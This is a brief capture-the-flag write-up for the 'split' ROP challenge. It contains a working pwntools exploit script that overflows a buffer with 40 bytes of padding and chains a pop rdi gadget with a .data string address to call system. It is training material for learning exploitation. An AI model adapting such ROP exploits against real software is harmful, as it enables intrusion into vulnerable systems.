# Challenge Solution and Theory
This is a simple rop chain challenge where the attacker builds a three gadget chain in order to call the system function with a string inside the binary's .data section. 
## Script:
```python
#!/usr/bin/python3
import pwn
binary = "split"
pwn.context.binary = binary
#pwn.context.encoding = "latin"
pwn.context.log_level = "debug"

padding = 40
gadget_pop_rdi = pwn.p64(0x4007c3)
address_read_flag = pwn.p64(0x601060)
address_call_system = pwn.p64(0x40074b)
payload = b"A"*padding + gadget_pop_rdi + address_read_flag + address_call_system

with open("input", "wb") as debug:
    debug.write(payload)

with pwn.process(binary) as io:
    io.send(payload)
    io.interactive()
```
